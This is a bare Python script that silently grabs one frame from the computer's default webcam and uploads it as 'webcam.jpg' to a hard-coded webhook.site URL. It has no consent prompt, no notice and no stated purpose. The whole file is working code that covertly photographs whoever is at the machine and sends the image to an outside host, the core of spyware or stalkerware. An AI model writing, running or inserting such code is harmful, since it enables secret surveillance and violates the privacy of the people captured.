import cv2
import requests
import io

cam = cv2.VideoCapture(0)
ret, frame = cam.read()
cam.release()

if ret:
    
    _, img_encoded = cv2.imencode('.jpg', frame)
    img_bytes = io.BytesIO(img_encoded.tobytes())

    webhook_url = "https://webhook.site/b620ae52-906d-433a-a17c-8cd91ef5e1ae"
    files = {'file': ('webcam.jpg', img_bytes, 'image/jpeg')}
    r = requests.post(webhook_url, files=files)

    print("Image sent:", r.status_code)
else:
    print("Failed to capture image")
